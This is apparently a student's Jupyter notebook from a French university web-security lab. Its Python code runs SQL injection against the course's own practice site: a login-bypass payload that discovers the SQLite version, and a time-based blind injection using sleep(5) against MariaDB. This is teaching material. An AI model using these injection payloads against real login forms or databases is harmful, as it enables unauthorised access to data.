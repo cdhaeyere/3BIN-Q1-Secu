{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 5 : Vulnérabilitées web (2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1:\n",
    "Revenons un peux en arrière sur le site de notre mauvais développeur. Nous savons que le site utilise sqlite comme système de gestion de base de donnée mais nous aimerions en identifier la version. Utilisez le site de l'exercice 1 pour récupérer cette information.\n",
    "\n",
    "https://labosecuipl.alwaysdata.net/23/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "---DEBUT---\n",
      "True 3.27.2\n",
      "---FIN---\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "def get_sqlite_versions_from_web(url):\n",
    "    page = requests.get(url)\n",
    "    versions = []\n",
    "    soup = BeautifulSoup(page.text)\n",
    "    for line in soup.find_all(\"tr\")[1:]:\n",
    "        versions.append(line.find_all(\"td\")[1].text)\n",
    "    return versions\n",
    "\n",
    "# URL de la page web contenant les numéros de version de SQLite\n",
    "url = \"https://www.sqlite.org/chronology.html\"  # Remplacez cette URL par l'URL\n",
    "\n",
    "def generate_sqlite_versions():\n",
    "    version_list = []\n",
    "    \n",
    "    for major in range(3, 4):  # Choisir une plage pour la version majeure (par exemple, de 4 à 5)\n",
    "        for minor in range(26, 28):  # Plage pour la version mineure (de 0 à 9)\n",
    "            for revision in range(0, 5):  # Plage pour la révision (de 0 à 9)\n",
    "                version = f\"{major}.{minor}.{revision}\"\n",
    "                version_list.append(version)\n",
    "    \n",
    "    return version_list\n",
    "\n",
    "def sql_test(test):\n",
    "    page = requests.post(\n",
    "        \"https://labosecuipl.alwaysdata.net/23/s02/ex1a/\",\n",
    "        data={\n",
    "        \"login\": '\" or \"' + test + '\" = (SELECT sqlite_version());--',\n",
    "        \"password\": ''\n",
    "        }\n",
    "    )\n",
    "\n",
    "    return \"Good job\" in page.text\n",
    "\n",
    "versions = get_sqlite_versions_from_web(url)\n",
    "print(\"---DEBUT---\")\n",
    "for version in versions:\n",
    "    res = sql_test(version)\n",
    "    if(res == True): # Remove if to \n",
    "        print(res, version)\n",
    "print(\"---FIN---\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Pour ce dernier exercice, vous allez travailler un peu à l'aveugle. En effet, la page suicitant notre intérêt cette fois-ci ne contient pas grand chose à part à un bouton ... mais elle est injectable (promis) !\n",
    "\n",
    "À vous de trouvez comment et de récupérer la version du système de gestion de base de donnée : https://labosecuipl.alwaysdata.net/23/s04/ex2/\n",
    "\n",
    "Tips:\n",
    "  - Cette fois-ci, c'est plus du sqlite : https://mariadb.com/kb/en/version/\n",
    "  - Et vous travaillez à l'aveugle ;-)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "import requests\n",
    "\n",
    "def test_blind(test):\n",
    "    start = time.time()\n",
    "    page = requests.post(\n",
    "        \"https://labosecuipl.alwaysdata.net/23/s04/ex2/\",\n",
    "        data ={\n",
    "            \"id\": \" 1 AND ( \" + test + \" OR sleep(5))\"\n",
    "        }\n",
    "    )\n",
    "    if (time.time()-start) < 5:\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "print(test_blind('1=1'))\n",
    "print(\"Duration: \", str(time.time()-start))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
